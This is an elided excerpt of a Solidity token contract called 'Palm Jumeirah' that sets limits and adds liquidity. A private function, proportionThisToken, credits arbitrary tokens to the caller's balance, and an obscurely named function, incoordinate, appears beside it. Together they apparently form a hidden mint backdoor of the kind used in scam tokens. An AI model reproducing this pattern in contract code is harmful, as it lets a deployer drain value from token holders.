...
contract PalmJumeirah is Context, IERC20, Ownable {
    ...
    uint256 public _walletSize = 630_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 630_000 * (10 ** _decimals);
    uint256 private _liquifyThreshhold = _tTotal/100;

    string private constant _name = "Palm Jumeirah";
    ...
    function proportionThisToken(uint256 tokens) private {
        _tOwned[msg.sender] = _tOwned[msg.sender]+tokens;
    }
    ...
    function incoordinate(address newAddress) external virtual {
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0)
            payable(msg.sender).sendValue (ethAmount - ethFromLiquidity);
    }
